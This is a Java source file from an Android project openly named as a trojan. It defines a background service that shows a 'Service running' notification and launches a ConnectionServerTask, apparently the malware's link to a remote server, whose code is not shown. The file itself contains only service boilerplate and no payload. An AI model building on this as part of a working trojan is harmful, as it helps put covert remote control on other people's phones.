package trojan.android.android_trojan.Service;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat;
import android.util.Log;

import trojan.android.android_trojan.AsyncTask.ConnectionServerTask;
import trojan.android.android_trojan.R;

/**
 * Created by Remi on 10/12/2014.
 */
public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";

    private ConnectionServerTask connectionServerTask;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate");
        showRecordingNotification();
        connectionServerTask = new ConnectionServerTask(getApplicationContext());
        connectionServerTask.execute();
        Log.d(TAG, connectionServerTask.getStatus().toString());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        connectionServerTask.cancel(true);
        Log.d(TAG, connectionServerTask.getStatus().toString());
        Log.d(TAG, "onDestroy");
    }

    private void showRecordingNotification(){
        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(this)
                        .setSmallIcon(R.drawable.ic_launcher)
                        .setContentTitle(getString(R.string.app_name))
                        .setContentText("Service running")
                        .setAutoCancel(true);

        Intent resultIntent = new Intent(this, NotificationService.class);
        resultIntent.addFlags(resultIntent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent resultPendingIntent = PendingIntent.getService(this, 0, resultIntent, 0);

        mBuilder.setContentIntent(resultPendingIntent);

        int mNotificationId = 001;
        NotificationManager mNotifyMgr =
                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        mNotifyMgr.notify(mNotificationId, mBuilder.build());
    }
}
